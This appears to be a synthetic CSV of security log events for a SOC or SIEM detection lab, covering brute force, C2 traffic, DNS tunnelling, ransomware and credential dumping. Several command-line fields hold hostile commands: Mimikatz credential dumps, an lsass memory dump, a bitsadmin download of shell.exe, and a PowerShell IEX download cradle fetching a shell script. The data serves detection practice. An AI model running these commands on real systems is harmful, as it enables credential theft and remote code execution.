access_type,action,action_taken,agent_ip,agent_name,attachment,attacker_host,attempt_count,bytes_sent,bytes_transferred,cloud_provider,command,command_line,destination_domain,destination_host,destination_ip,destination_port,dns_query,encryption_type,event_code,event_type,failure_reason,file_hash,file_path,files_affected,host,image,indicator,injection_type,lab_attack,lab_note,log_source,login_location_1,login_location_2,logon_type,malware_name,mitre_technique,parent_process,ports_scanned,privileges_assigned,process,process_id,protocol,query_count,query_type,recipient,registry_key,resource,rule_name,scan_type,sender,service_name,severity,signature,signature_id,signed,source_host,source_ip,source_process,subject,target_ip,target_process,time_difference_minutes,timestamp,tool,user,value,wazuh_rule_desc,wazuh_rule_id
,,,,,,,,,,,,,,,45.67.22.10,1337,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,msiexec.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-21T12:46:37.663542,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Users\Public\payload.dll,,,,,Sysmon,,,,,T1055.001,,,,cscript.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-20T14:03:37.663797,,,,,
,,,,,,,346,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T04:40:37.662499,Hydra,root,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,mshta.exe,,,,,,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,,,,,,High,,,,,,,,,,,2026-04-23T04:24:37.664021,,,C:\Windows\Temp\backdoor.exe,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,0123456789abcdef0123456789abcdef,C:\Users\Public\malware.exe,,WIN-DC-PRAHARSH,,,,,,Windows Defender / Wazuh,,,,Emotet,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T20:45:37.667296,,,,,
,,,,,,,239,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T01:21:37.662208,Hydra / CrackMapExec,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-PRAHARSH-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.103,,,,,,2026-04-21T06:30:37.660708,,finance.user,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,42189,DEV-SERVER-01,,Ransom note created: README_DECRYPT.txt,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T21:50:37.667750,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WAZUH-MANAGER-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.15,,,,,,2026-04-20T10:14:37.660754,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,bitsadmin.exe,,,,,,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,,,,,,High,,,,,,,,,,,2026-04-20T11:49:37.664126,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,,,,,,,,ZXhmaWw.mimikatz-payload[.]ru,,,DNS Tunneling Detected,,,,,FIN-SERVER-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,912,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-20T15:07:37.666605,,,,,
,,,,,,KALI-LAB-01,344,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T06:53:37.661502,Hydra,lab.administrator,,,
,,,,,,,,,,,,mimikatz.exe lsadump::sam,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,meterpreter.exe,4475,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T19:53:37.663326,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,wscript.exe,,,,,,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,,,,,,High,,,,,,,,,,,2026-04-21T21:10:37.664136,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,FIN-SERVER-01,,,,True,,Windows Security,,,,,T1068,,,SeRestorePrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T10:58:37.665388,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,ELK-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,91.234.56.78,,,,,,2026-04-23T10:00:37.659967,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,SPLUNK-VM-01,,,,True,,Windows Security,,,,,T1068,,,SeImpersonatePrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-24T09:28:37.665384,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-21T14:23:37.660189,,john.doe,,,
,,,,,,,182,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T12:52:37.662465,Hydra,splunk,,,
,,,,,,,,,,,,,,FIN-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,SPLUNK-VM-01,172.16.0.100,,,,,,2026-04-20T01:41:37.665614,,lab.administrator,,,
,,,,,,,,4238040,,,,,evil-c2[.]com,,23.129.64.100,4444,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T10:49:37.666324,,,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,powershell.exe,,,,,,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,,,,,,High,,,,,,,,,,,2026-04-24T09:58:37.664060,,,powershell -enc AAAA,,
,,,,,,,,,,,,,,SPLUNK-VM-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,DEV-SERVER-01,192.168.56.101,,,,,,2026-04-22T22:22:37.665434,,attacker,,,
,,,,,,,,,,,,bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,bitsadmin.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T20:44:37.664958,,dev.engineer,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,FIN-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T22:34:37.664480,,lab.administrator,,,
,,,,,,,,,,,,procdump.exe -ma lsass.exe lsass.dmp,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,mimikatz.exe,1614,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-24T06:40:37.663344,,praharsh.admin,,,
,,,,,,,,,,,,mimikatz.exe lsadump::sam,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,mimikatz.exe,3553,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T16:35:37.663376,,praharsh.admin,,,
,,,,,,,103,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T06:47:37.662203,Hydra / CrackMapExec,john.doe,,,
,,,,,,,96,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T09:55:37.662469,Hydra,splunk,,,
,,,,,,,,,,,,,,,,,ZXhmaWw.malware-drop[.]net,,,DNS Tunneling Detected,,,,,SPLUNK-VM-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,771,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-22T16:00:37.666600,,,,,
,,,,,,,,,,,,,,,,,aGVsbG8.phish-praharsh-lab[.]xyz,,,DNS Tunneling Detected,,,,,WIN-PRAHARSH-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,323,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-24T13:21:37.666766,,,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T15:19:37.662864,,temp.analyst,,,
,,,,,,,,7479601,,,,,phish-praharsh-lab[.]xyz,,185.220.101.45,4444,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-21T09:10:37.666367,,,,,
,,,,,,,,5263469,,,,,phish-praharsh-lab[.]xyz,,91.234.56.78,4444,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T00:03:37.666384,,,,,
,,,,,,,,7960034,,,,,phish-praharsh-lab[.]xyz,,45.67.22.10,9001,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-20T02:19:37.666292,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,ELK-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.101,,,,,,2026-04-23T19:31:37.659608,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,cscript.exe,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,High,,,,,,,,,,,2026-04-20T17:15:37.664158,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Windows\Temp\malicious.dll,,,,,Sysmon,,,,,T1055.001,,,,cscript.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-20T09:33:37.663734,,,,,
,,,,,,,,,,,,wmic /node:TARGET process call create cmd.exe,,SPLUNK-VM-01,,,,,1,WMI Remote Execution,,,,,,,,,,,Sysmon,,,,,T1047,,,,wmiprvse.exe,,,,,,,,,,,,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-23T03:55:37.665970,,dev.engineer,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,33276,WIN-DC-PRAHARSH,,Shadow copies deleted via vssadmin,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T14:12:37.667773,,,,,
,,,,,,,,,,,,,,,103.45.78.21,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET POLICY Outbound SSH Connection,2370098,,,192.168.56.101,,,,,,2026-04-21T20:15:37.668788,,,,,
,,,,,,,,,,,,mimikatz.exe sekurlsa::logonpasswords,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,meterpreter.exe,1420,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T13:11:37.663223,,praharsh.admin,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.10,23,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-SSH-External,,,,Low,,,,,192.168.56.104,,,,,,2026-04-21T02:04:37.668404,,,,,
,,,,,,,,,,,,bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,certutil.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T22:45:37.664983,,dev.engineer,,,
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,KALI-LAB-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T08:56:37.664695,,john.doe,,,
,CreateAccessKey,,,,,,,,,GCP,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,ec2:sg-12345,,,,,High,,,,,,,,,,,2026-04-19T17:12:37.667890,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,ELK-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,45.67.22.10,,,,,,2026-04-20T08:39:37.660358,,john.doe,,,
,,,,,,,,,,,,,,,103.45.78.21,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET POLICY Outbound SSH Connection,2122932,,,192.168.56.105,,,,,,2026-04-22T22:20:37.668927,,,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.103,4444,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-RDP,,,,Low,,,,,185.220.101.45,,,,,,2026-04-20T19:25:37.668356,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,WIN-PRAHARSH-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-24T07:40:37.659854,,finance.user,,,
,,,,,,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,jane.smith@praharsh-lab.local,,,,,ceo@company-update[.]net,,High,,,,,,,Your account has been compromised,,,,2026-04-20T01:40:37.669279,,,,,
,,,,,,,,,,,,,,,,,aGVsbG8.malware-drop[.]net,,,DNS Tunneling Detected,,,,,DEV-SERVER-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,522,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-22T04:17:37.666663,,,,,
,,,,,,KALI-LAB-01,219,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T04:38:37.661644,Hydra,lab.administrator,,,
,,,,,,,,,,,powershell.exe -enc SQBFAFgA,,,,,,,,4104,PowerShell Execution,,,,,WIN-PRAHARSH-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T03:46:37.664440,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Users\Public\payload.dll,,,,,Sysmon,,,,,T1055.001,,,,powershell.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-19T21:46:37.663746,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,ELK-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-20T11:05:37.659668,,svc.splunk,,,
,,,,,,,397,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T03:33:37.662583,Hydra,admin,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,KALI-LAB-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.102,,,,,,2026-04-20T00:12:37.660781,,finance.user,,,
,,,,,,,226,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-19T15:45:37.662507,Hydra,admin,,,
,BLOCK,,,,,,,,,,,,,,172.16.0.100,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-Kali-Attacker,,,,Low,,,,,45.67.22.10,,,,,,2026-04-24T14:57:37.668477,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,KALI-LAB-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.105,,,,,,2026-04-21T22:48:37.660616,,finance.user,,,
,,,,,,,,2311074,,,,,mimikatz-payload[.]ru,,185.220.101.45,443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T03:57:37.666227,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,FIN-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-23T00:23:37.660511,,svc.splunk,,,
,,Quarantined,,,,,,,,,,,,,,,,,,Malware Detected,,5f4dcc3b5aa765d61d8327deb882cf99,C:\Users\Public\malware.exe,,WAZUH-MANAGER-01,,,,,,Windows Defender / Wazuh,,,,Meterpreter,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T02:01:37.667463,,,,,
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,ELK-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-19T17:20:37.664615,,svc.splunk,,,
,,Cleaned,,,,,,,,,,,,,,,,,,Malware Detected,,e10adc3949ba59abbe56e057f20f883e,C:\Windows\Temp\payload.dll,,WAZUH-MANAGER-01,,,,,,Windows Defender / Wazuh,,,,Ryuk.Ransomware,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T15:57:37.667352,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,103.45.78.21,,,,,,2026-04-24T03:14:37.659673,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-PRAHARSH-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.15,,,,,,2026-04-23T23:57:37.661183,,john.doe,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.15,,,,,,2026-04-21T18:57:37.660958,,svc.splunk,,,
,,,,,,,260,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-19T19:53:37.662681,Hydra,ubuntu,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,FIN-SERVER-01,,,Process Hollowing,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,wmic.exe,,,notepad.exe,,2026-04-21T23:29:37.667554,,,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,28786,FIN-SERVER-01,,Ransom note created: README_DECRYPT.txt,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T07:07:37.667781,,,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.101,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-SMB,,,,Low,,,,,103.45.78.21,,,,,,2026-04-22T00:11:37.668686,,,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,comsvcs.dll,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-23T22:49:37.667125,,praharsh.admin,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,comsvcs.dll,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-21T03:26:37.667201,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Windows\Temp\payload.exe,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,msiexec.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-19T23:13:37.663994,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T02:10:37.662947,,finance.user,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.105,445,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-SMB,,,,Low,,,,,45.67.22.10,,,,,,2026-04-20T16:13:37.668278,,,,,
,,,,,,,,,,,,,,,91.234.56.78,443,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,wscript.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-20T20:22:37.663613,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T23:34:37.662926,,attacker,,,
,,,,,,,,,,,,powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.104:8080/shell.ps1'),,,192.168.56.104,4444,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-19T21:33:37.664413,Metasploit / Netcat,finance.user,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.15,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-SMB,,,,Low,,,,,103.45.78.21,,,,,,2026-04-23T22:50:37.668241,,,,,
,,,,,,,,,,,,,,,194.165.16.11,443,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,rundll32.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-21T19:38:37.663507,,lab.administrator,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.15,23,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-RDP,,,,Low,,,,,194.165.16.11,,,,,,2026-04-24T05:43:37.668378,,,,,
,,,,,,,216,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T02:53:37.662296,Hydra / CrackMapExec,svc.splunk,,,
,,,192.168.56.102,SPLUNK-VM-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T07:03:37.669447,,,,Suspicious process spawned,5710
,,,,,,,,,188915538,,,,,,91.234.56.78,,,,,Data Exfiltration Suspected,,,,,KALI-LAB-01,,,,,,Firewall,,,,,T1048,,,,,,SFTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T21:29:37.666890,,lab.administrator,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.15,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-C2-Ports,,,,Low,,,,,91.234.56.78,,,,,,2026-04-20T13:18:37.668304,,,,,
,,,,,,,,,,Azure AD,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,Germany,China,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,22,2026-04-19T21:46:37.668151,,svc.splunk,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.105,23,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-C2-Ports,,,,Low,,,,,192.168.56.104,,,,,,2026-04-24T00:46:37.668580,,,,,
,,,,,,,73,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T11:59:37.661746,Hydra / CrackMapExec,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Windows\Temp\malicious.dll,,,,,Sysmon,,,,,T1055.001,,,,powershell.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-23T13:53:37.663754,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,WIN-DC-PRAHARSH,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,103.45.78.21,,,,,,2026-04-21T10:16:37.660369,,attacker,,,
,,,,,,,,,,,,,,,194.165.16.11,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,High,ET POLICY Outbound SSH Connection,2594751,,,192.168.56.102,,,,,,2026-04-21T01:45:37.668766,,,,,
